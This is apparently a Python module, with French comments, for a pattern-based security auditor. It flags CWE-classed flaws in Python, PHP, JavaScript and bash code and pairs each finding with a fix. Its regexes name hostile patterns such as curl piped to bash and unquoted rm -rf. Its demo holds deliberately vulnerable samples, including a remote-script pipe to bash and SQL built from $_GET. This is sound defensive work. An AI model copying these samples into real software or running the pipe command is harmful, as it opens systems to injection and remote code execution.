"""
AUDIT DE CODE — le domaine DÉVELOPPEMENT/SÉCURITÉ, borné par des RÈGLES POSÉES (mandat Yohan 2026-06-23).

Réponse à Yohan : « le développement et le code n'est pas ENTIÈREMENT borné, pourtant il y a des règles de
mise en place, de codage, de sécurité dans chaque langage ». Exact. Comme `regle.py` pour le droit/HACCP, ce
domaine se borne par un RÉFÉRENTIEL de règles VÉRIFIABLES :
  • classes de vulnérabilité DOCUMENTÉES (CWE/OWASP) — sémantique du langage, pas une opinion ;
  • anti-patterns de codage DÉTERMINISTES (argument par défaut mutable, except nu…).

CE QUI EST BORNÉ (sound, « sûr avant rapide ») :
  • la PRÉSENCE d'un motif dangereux DÉFINI dans un code donné est un FAIT vérifiable par inspection :
    `eval(<variable>)` EST une injection de code (CWE-95) ; `mysql_query("...".$_GET[...])` EST une
    injection SQL (CWE-89). On rend un CONSTAT daté/sourcé (l'id CWE), pas un jugement subjectif.

CE QUI N'EST PAS BORNÉ (-> on NE l'affirme JAMAIS) :
  • « ce code est SÛR / sans faille » : prouver l'ABSENCE de toute vulnérabilité est indécidable. Aucune
    règle ne sort « sécurisé ». `audite` rend des CONSTATS ; zéro constat = `RAS` (= « aucun motif connu
    détecté », EXPLICITEMENT PAS une preuve de sécurité). C'est l'exacte symétrie du « jamais un faux ».

GARANTIES STRUCTURELLES (vérifiées en adverse par `valide_audit_code.py`) :
  - SOUNDNESS / zéro faux positif : un code CORRIGÉ (API sûre, requête préparée, échappement) ne déclenche
    JAMAIS la règle correspondante. Les détecteurs sont CONSERVATEURS : dans le doute, ils s'ABSTIENNENT
    (faux négatif toléré — on ne prétend jamais à l'exhaustivité ; faux positif INTERDIT).
  - langage inconnu -> (HORS, []) : jamais un audit deviné.
  - chaque constat porte un CWE + une remédiation BORNÉE (la règle de codage sûre établie).

NB honnêteté : ce module DÉTECTE des motifs connus ; il ne remplace pas une revue humaine ni un SAST complet.
La GARANTIE porte sur le MÉCANISME (un constat émis EST réel) et sur l'abstention (jamais « sécurisé »).
"""
from __future__ import annotations

import dataclasses
import re

# Statuts (mêmes conventions que base_faits / regle : on ne sort un constat que VÉRIFIÉ).
VERIFIE = "verifie"      # au moins un motif dangereux DÉFINI a été constaté
RAS = "ras"              # aucun motif connu détecté — PAS une preuve de sécurité
HORS = "hors"            # langage hors référentiel : on n'audite pas à l'aveugle

LANGAGES = ("python", "php", "javascript", "bash")

# Gravités (échelle ordinale lisible, pas un score chiffré prétendu exact).
CRITIQUE, ELEVE, MOYEN = "critique", "élevé", "moyen"


@dataclasses.dataclass(frozen=True)
class Constat:
    """Un constat d'audit = un FAIT vérifiable sur le code."""
    regle: str          # identifiant interne de la règle (ex. "py-eval")
    cwe: str            # référence CWE (ex. "CWE-95")
    titre: str          # classe de vulnérabilité / anti-pattern
    langage: str
    ligne: int          # 1-based
    extrait: str        # la ligne fautive (strip)
    gravite: str
    pourquoi: str       # pourquoi c'est dangereux (borné)
    remediation: str    # la règle de codage sûre (bornée)


# ----------------------------------------------------------------------------- utilitaires de détection
def _lignes(code: str) -> list[str]:
    return code.split("\n")


def _sans_commentaire_py(l: str) -> str:
    # retire un commentaire # simple (heuristique conservatrice : ignore le # entre quotes basiques).
    i = l.find("#")
    return l if i < 0 else l[:i]


# Superglobales PHP = sources de données contrôlées par l'attaquant.
_SUPER = r"\$_(GET|POST|REQUEST|COOKIE|SERVER\['HTTP_|FILES)"


def _php_tainted_vars(code: str) -> set[str]:
    """Taint léger SOUND : variables affectées DIRECTEMENT depuis une superglobale (ou concat en contenant)."""
    t = set()
    for l in _lignes(code):
        m = re.match(r"\s*(\$[A-Za-z_]\w*)\s*=\s*(.+);", l)
        if m and re.search(_SUPER, m.group(2)):
            t.add(m.group(1))
    return t


def _source_active(arg: str, sources: list[str]) -> bool:
    """True si une source apparaît en position de VALEUR (pas comme clé d'un tableau).
    `$arr[$_GET['k']]` / `WHITELIST[$p]` -> source NEUTRALISÉE (la valeur vient du tableau côté serveur,
    idiome de liste blanche) ; `$_GET['k']` / `$p` comme valeur -> ACTIVE (dangereuse)."""
    for pat in sources:
        for m in re.finditer(pat, arg):
            j = m.start() - 1
            while j >= 0 and arg[j].isspace():
                j -= 1
            if j >= 0 and arg[j] == "[":
                continue                     # utilisée comme clé de tableau -> neutralisée
            return True
    return False


def _contient_source_php(arg: str, tainted: set[str]) -> bool:
    sources = [_SUPER] + [re.escape(v) + r"\b" for v in tainted]
    return _source_active(arg, sources)


# ----------------------------------------------------------------------------- détecteurs PYTHON
def _audit_python(code: str) -> list[Constat]:
    out = []
    lignes = _lignes(code)
    for i, brut in enumerate(lignes, 1):
        l = _sans_commentaire_py(brut)
        s = l.strip()

        # CWE-95 : eval/exec sur du dynamique. literal_eval est sûr -> exclu.
        for fn in ("eval", "exec"):
            for m in re.finditer(r"(?<![\w.])" + fn + r"\s*\(", l):
                # exclure ast.literal_eval / .eval méthode d'objet (déjà géré par lookbehind .)
                if "literal_eval" in l:
                    continue
                arg = _arg(l, m.end() - 1)
                # sûr seulement si l'argument est une chaîne littérale PURE (pas de variable/concat/format).
                if arg is not None and _est_litteral_py(arg):
                    continue
                out.append(Constat("py-eval", "CWE-95", "Injection de code (eval/exec dynamique)",
                                   "python", i, s, CRITIQUE,
                                   f"{fn}() exécute du code arbitraire ; sur une donnée externe = RCE.",
                                   "ne jamais eval/exec une donnée ; ast.literal_eval pour un littéral, "
                                   "un dict de dispatch pour choisir un comportement."))

        # CWE-78 : subprocess shell=True (injection de commande).
        if re.search(r"shell\s*=\s*True", l):
            out.append(Constat("py-shell-true", "CWE-78", "Injection de commande (shell=True)",
                               "python", i, s, ELEVE,
                               "shell=True passe la commande à /bin/sh ; toute donnée concaténée s'injecte.",
                               "passer une LISTE d'arguments avec shell=False (défaut) ; shlex.quote si shell requis."))

        # CWE-78 : os.system / os.popen (toujours via le shell).
        if re.search(r"\bos\.(system|popen)\s*\(", l):
            arg = _arg(l, l.find("(", l.find("os.")))
            if not (arg is not None and _est_litteral_py(arg)):
                out.append(Constat("py-os-system", "CWE-78", "Injection de commande (os.system/os.popen)",
                                   "python", i, s, ELEVE,
                                   "os.system/os.popen exécutent via le shell ; donnée concaténée = injection.",
                                   "utiliser subprocess.run([...], shell=False)."))

        # CWE-502 : désérialisation non sûre.
        if re.search(r"\bpickle\.(loads|load)\s*\(", l):
            out.append(Constat("py-pickle", "CWE-502", "Désérialisation non sûre (pickle)",
                               "python", i, s, ELEVE,
                               "pickle.load exécute du code à la désérialisation ; sur une donnée externe = RCE.",
                               "utiliser un format de données (json) ; jamais pickle sur une source non fiable."))
        if re.search(r"\byaml\.load\s*\(", l) and not re.search(r"Safe(Loader)?|safe_load", l):
            out.append(Constat("py-yaml", "CWE-502", "Désérialisation non sûre (yaml.load)",
                               "python", i, s, ELEVE,
                               "yaml.load sans SafeLoader instancie des objets arbitraires.",
                               "yaml.safe_load(...) ou yaml.load(..., Loader=yaml.SafeLoader)."))

        # CWE-89 : SQL construit par formatage/concaténation dans .execute(...).
        me = re.search(r"\.execute\s*\(", l)
        if me:
            arg = _arg(l, me.end() - 1)
            if arg is not None and _sql_concatene_py(arg):
                out.append(Constat("py-sql", "CWE-89", "Injection SQL (requête construite par formatage)",
                                   "python", i, s, CRITIQUE,
                                   "concaténer/formatter une donnée dans le SQL casse la frontière code/données.",
                                   "requête PARAMÉTRÉE : execute('... WHERE id=?', (id,)) (placeholders + params)."))

        # Anti-pattern de codage : argument par défaut MUTABLE (état partagé entre appels).
        md = re.search(r"\bdef\s+\w+\s*\(([^)]*)\)", l)
        if md and re.search(r"=\s*(\[\s*\]|\{\s*\}|set\(\)|dict\(\)|list\(\))", md.group(1)):
            out.append(Constat("py-mutable-default", "CWE-665", "Argument par défaut mutable",
                               "python", i, s, MOYEN,
                               "un défaut [] / {} est partagé entre tous les appels (état qui fuit).",
                               "défaut None puis initialiser dans le corps : if x is None: x = []."))

        # CWE-327 : hash faible utilisé pour un mot de passe (contextuel -> seulement si 'pass'/'pwd' proche).
        if re.search(r"\bhashlib\.(md5|sha1)\s*\(", l) and re.search(r"pass|pwd|mot.?de.?passe|secret", l, re.I):
            out.append(Constat("py-weak-hash", "CWE-327", "Hash faible pour un secret (md5/sha1)",
                               "python", i, s, MOYEN,
                               "md5/sha1 sont cassés/rapides ; inadaptés au stockage de mots de passe.",
                               "hashlib via un KDF lent : bcrypt/argon2/scrypt/PBKDF2."))
    return out


def _est_litteral_py(arg: str) -> bool:
    """True ssi l'argument est UNE chaîne littérale unique (sans f-string, concat, format) :
    le `+`/`%` ÉVENTUEL est alors À L'INTÉRIEUR des quotes, pas une composition -> sûr."""
    a = arg.strip()
    # un seul littéral chaîne, préfixes r/b autorisés (pas f) ; pas de quote interne -> pas de concat masquée.
    return bool(re.match(r"""(?i)^[rb]{0,2}'[^'\\]*'$""", a)
                or re.match(r'''(?i)^[rb]{0,2}"[^"\\]*"$''', a))


def _sql_concatene_py(arg: str) -> bool:
    a = arg.strip()
    if re.match(r"""^[rbRB]?f['"]""", a):          # f-string -> dynamique
        return True
    if re.search(r"""['"]\s*%[^=]""", a) or re.search(r"%\s*\(", a):  # %-formatting
        return True
    if ".format(" in a:                              # .format
        return True
    if re.search(r"""['"]\s*\+""", a) or re.search(r"""\+\s*['"]""", a):  # concat de chaîne
        return True
    return False


def _arg(l: str, paren_open: int) -> str | None:
    """Extrait le texte de l'argument entre la parenthèse ouvrante donnée et sa fermante (même ligne)."""
    if paren_open < 0 or paren_open >= len(l) or l[paren_open] != "(":
        return None
    depth = 0
    for j in range(paren_open, len(l)):
        c = l[j]
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return l[paren_open + 1:j]
    return l[paren_open + 1:]   # parenthèse non fermée sur la ligne : on rend ce qu'on a


# ----------------------------------------------------------------------------- détecteurs PHP
def _audit_php(code: str) -> list[Constat]:
    out = []
    tainted = _php_tainted_vars(code)
    for i, brut in enumerate(_lignes(code), 1):
        l = brut
        s = l.strip()

        # CWE-89 : SQL avec superglobale/variable taintée inlinée, hors requête préparée.
        mq = re.search(r"(mysqli?_query|->query|pg_query)\s*\(", l)
        if mq:
            arg = _arg_php(l, mq.end() - 1)
            if arg and _contient_source_php(arg, tainted) and "prepare" not in l:
                out.append(Constat("php-sql", "CWE-89", "Injection SQL (entrée concaténée)",
                                   "php", i, s, CRITIQUE,
                                   "une superglobale/variable utilisateur inlinée dans le SQL s'injecte.",
                                   "requête PRÉPARÉE : prepare() + bind_param/placeholders."))

        # CWE-79 : XSS — echo/print d'une source sans échappement.
        me = re.search(r"\b(echo|print)\b(.*)", l)
        if me:
            reste = me.group(2)
            if _contient_source_php(reste, tainted) and not re.search(
                    r"htmlspecialchars|htmlentities|intval|\(int\)", reste):
                out.append(Constat("php-xss", "CWE-79", "XSS (sortie non échappée)",
                                   "php", i, s, ELEVE,
                                   "afficher une donnée utilisateur sans échappement injecte du HTML/JS.",
                                   "htmlspecialchars($x, ENT_QUOTES, 'UTF-8') à l'affichage."))

        # CWE-78 : exécution de commande avec source.
        mc = re.search(r"\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\(", l)
        if mc:
            arg = _arg_php(l, mc.end() - 1)
            if arg and _contient_source_php(arg, tainted) and not re.search(
                    r"escapeshellarg|escapeshellcmd", arg):
                out.append(Constat("php-cmd", "CWE-78", "Injection de commande",
                                   "php", i, s, CRITIQUE,
                                   "une donnée utilisateur passée au shell s'injecte (RCE).",
                                   "éviter le shell ; sinon escapeshellarg() sur chaque argument."))

        # CWE-95 : eval d'une variable.
        if re.search(r"\beval\s*\(", l) and re.search(r"\$", l):
            out.append(Constat("php-eval", "CWE-95", "Injection de code (eval)",
                               "php", i, s, CRITIQUE,
                               "eval() sur une donnée exécute du code arbitraire.",
                               "supprimer eval ; utiliser une logique explicite/dispatch."))

        # CWE-98 : LFI/RFI — include/require d'une source.
        mi = re.search(r"\b(include|include_once|require|require_once)\b(.*)", l)
        if mi and _contient_source_php(mi.group(2), tainted):
            out.append(Constat("php-lfi", "CWE-98", "Inclusion de fichier contrôlée par l'entrée (LFI/RFI)",
                               "php", i, s, CRITIQUE,
                               "inclure un chemin contrôlé par l'utilisateur permet d'exécuter un fichier arbitraire.",
                               "liste blanche de fichiers autorisés ; basename() + validation stricte."))

        # CWE-502 : unserialize d'une source.
        mu = re.search(r"\bunserialize\s*\(", l)
        if mu:
            arg = _arg_php(l, mu.end() - 1)
            if arg and _contient_source_php(arg, tainted):
                out.append(Constat("php-unserialize", "CWE-502", "Désérialisation non sûre (unserialize)",
                                   "php", i, s, ELEVE,
                                   "unserialize sur une donnée externe instancie des objets arbitraires.",
                                   "json_decode pour des données ; jamais unserialize sur une source externe."))

        # CWE-94/variable injection : extract() sur une superglobale.
        if re.search(r"\bextract\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)", l):
            out.append(Constat("php-extract", "CWE-915", "Injection de variables (extract de superglobale)",
                               "php", i, s, ELEVE,
                               "extract($_REQUEST) crée des variables contrôlées par l'attaquant.",
                               "ne jamais extract() une superglobale ; lire explicitement chaque champ."))
    return out


def _arg_php(l: str, paren_open: int) -> str | None:
    return _arg(l, paren_open)


# ----------------------------------------------------------------------------- détecteurs JAVASCRIPT
def _audit_js(code: str) -> list[Constat]:
    out = []
    for i, brut in enumerate(_lignes(code), 1):
        l = brut
        s = l.strip()

        # CWE-95 : eval / Function constructor avec variable.
        for m in re.finditer(r"(?<![\w.])eval\s*\(", l):
            arg = _arg(l, m.end() - 1)
            if not (arg is not None and _est_litteral_js(arg)):
                out.append(Constat("js-eval", "CWE-95", "Injection de code (eval)",
                                   "javascript", i, s, CRITIQUE,
                                   "eval() exécute du code arbitraire.",
                                   "JSON.parse pour des données ; supprimer eval."))
        if re.search(r"new\s+Function\s*\(", l):
            out.append(Constat("js-function-ctor", "CWE-95", "Injection de code (new Function)",
                               "javascript", i, s, ELEVE,
                               "new Function(...) compile du code à l'exécution comme eval.",
                               "remplacer par une logique explicite."))

        # CWE-78 : child_process.exec avec concat/template.
        mc = re.search(r"(child_process\.)?exec\s*\(", l)
        if mc and ("child_process" in code or "require('child_process')" in code or "exec(" in l):
            arg = _arg(l, mc.end() - 1)
            if arg is not None and _js_dynamique(arg) and "execFile" not in l:
                out.append(Constat("js-exec", "CWE-78", "Injection de commande (child_process.exec)",
                                   "javascript", i, s, ELEVE,
                                   "exec() lance un shell ; une donnée concaténée s'injecte.",
                                   "execFile()/spawn() avec un tableau d'arguments (pas de shell)."))

        # CWE-79 : DOM XSS — innerHTML / document.write d'une variable.
        mh = re.search(r"\.innerHTML\s*=\s*(.+)", l)
        if mh and _js_dynamique(mh.group(1)):
            out.append(Constat("js-innerhtml", "CWE-79", "DOM XSS (innerHTML dynamique)",
                               "javascript", i, s, ELEVE,
                               "écrire une donnée dans innerHTML injecte du HTML/JS.",
                               "textContent pour du texte ; sinon assainir (DOMPurify)."))
        md = re.search(r"document\.write\s*\(", l)
        if md:
            arg = _arg(l, md.end() - 1)
            if arg is not None and _js_dynamique(arg):
                out.append(Constat("js-docwrite", "CWE-79", "DOM XSS (document.write dynamique)",
                                   "javascript", i, s, ELEVE,
                                   "document.write d'une donnée injecte du contenu actif.",
                                   "construire le DOM via textContent/createElement."))
    return out


def _est_litteral_js(arg: str) -> bool:
    """True ssi l'argument est UNE chaîne littérale unique (le `+` éventuel est dans les quotes)."""
    a = arg.strip()
    return bool(re.match(r"^'[^'\\]*'$", a) or re.match(r'^"[^"\\]*"$', a))


def _js_dynamique(expr: str) -> bool:
    e = expr.strip().rstrip(";").strip()
    if re.match(r"""^['"][^'"]*['"]$""", e):     # littéral chaîne pur
        return False
    if re.match(r"^`[^`${]*`$", e):              # template sans interpolation
        return False
    if "`" in e and "${" in e:                   # template avec interpolation
        return True
    if "+" in e:                                  # concaténation
        return True
    # identifiant/appel/propriété (variable) -> dynamique
    return bool(re.search(r"[A-Za-z_$][\w$]*", e)) and not re.match(r"""^['"]""", e)


# ----------------------------------------------------------------------------- détecteurs BASH
def _audit_bash(code: str) -> list[Constat]:
    out = []
    for i, brut in enumerate(_lignes(code), 1):
        l = brut
        s = l.strip()
        if s.startswith("#"):
            continue

        # CWE-95 : eval d'une variable.
        if re.search(r"(^|\s|;)eval\s+", l) and re.search(r"\$", l):
            out.append(Constat("bash-eval", "CWE-95", "Injection de code (eval)",
                               "bash", i, s, ELEVE,
                               "eval ré-interprète la chaîne (variable comprise) comme commande.",
                               "éviter eval ; utiliser des tableaux bash (\"${arr[@]}\")."))

        # CWE-78 : pipe d'un téléchargement vers un interpréteur (RCE distant).
        if re.search(r"(curl|wget)\b.*\|\s*(sudo\s+)?(bash|sh|zsh)\b", l):
            out.append(Constat("bash-curl-pipe", "CWE-494", "Exécution de code distant non vérifié (curl | sh)",
                               "bash", i, s, ELEVE,
                               "exécuter directement un script téléchargé = code arbitraire non vérifié.",
                               "télécharger, VÉRIFIER (checksum/signature), puis exécuter."))

        # CWE-78 : rm -rf sur une variable non quotée (suppression élargie + injection de mot).
        if re.search(r"\brm\s+-[rfRF]+\s+\$[A-Za-z_]\w*(\s|$)", l) and not re.search(r'"\$', l):
            out.append(Constat("bash-rm-unquoted", "CWE-78", "Variable non quotée dans rm -rf",
                               "bash", i, s, MOYEN,
                               "une variable non quotée subit word-splitting/glob ; vide -> 'rm -rf /' implicite.",
                               'toujours quoter : rm -rf -- "$VAR" (et garder la variable non vide).'))
    return out


_DISPATCH = {
    "python": _audit_python,
    "php": _audit_php,
    "javascript": _audit_js,
    "bash": _audit_bash,
}
# alias de langage tolérés (jamais une devinette : un alias mappe vers un détecteur connu).
_ALIAS = {"py": "python", "js": "javascript", "node": "javascript", "nodejs": "javascript",
          "sh": "bash", "shell": "bash"}


def audite(code: str, langage: str) -> tuple[str, list[Constat]]:
    """Audite un code dans un langage du référentiel.
    Renvoie (statut, constats) :
      • (VERIFIE, [Constat...]) si au moins un motif dangereux DÉFINI est constaté ;
      • (RAS, [])  si aucun motif connu — CE N'EST PAS une preuve de sécurité ;
      • (HORS, []) si le langage est hors référentiel (jamais un audit deviné).
    """
    if not isinstance(code, str) or not isinstance(langage, str):
        return (HORS, [])
    lang = _ALIAS.get(langage.strip().lower(), langage.strip().lower())
    fn = _DISPATCH.get(lang)
    if fn is None:
        return (HORS, [])
    constats = fn(code)
    # tri stable par ligne puis règle (déterministe).
    constats.sort(key=lambda c: (c.ligne, c.regle))
    return (VERIFIE, constats) if constats else (RAS, [])


def explique(statut: str, constats: list[Constat]) -> str:
    """Rendu humain HONNÊTE (FR). RAS dit explicitement que ce n'est pas une preuve de sécurité."""
    if statut == HORS:
        return "[HORS] langage hors référentiel : je n'audite pas à l'aveugle."
    if statut == RAS:
        return ("[RAS] aucun motif de vulnérabilité connu détecté. "
                "ATTENTION : ceci N'EST PAS une preuve de sécurité (faux négatifs possibles ; "
                "fais une revue humaine).")
    lignes = [f"[VÉRIFIÉ] {len(constats)} constat(s) :"]
    for c in constats:
        lignes.append(f"  • L{c.ligne} [{c.cwe} · {c.gravite}] {c.titre}")
        lignes.append(f"      code   : {c.extrait}")
        lignes.append(f"      raison : {c.pourquoi}")
        lignes.append(f"      fix    : {c.remediation}")
    return "\n".join(lignes)


if __name__ == "__main__":
    demos = [
        ("python", "q = db.execute(f\"SELECT * FROM u WHERE id={uid}\")\neval(user_input)"),
        ("php", "$id=$_GET['id'];\n$r=mysqli_query($c,\"SELECT * FROM u WHERE id=\".$id);\necho $_GET['name'];"),
        ("javascript", "el.innerHTML = userName;\neval(payload);"),
        ("bash", "eval $cmd\ncurl http://x/i.sh | bash"),
        ("python", "q = db.execute('SELECT * FROM u WHERE id=?', (uid,))"),  # sûr -> RAS
        ("cobol", "DISPLAY 'X'."),                                            # hors -> HORS
    ]
    for lang, code in demos:
        st, cs = audite(code, lang)
        print(f"\n===== {lang} =====")
        print(explique(st, cs))
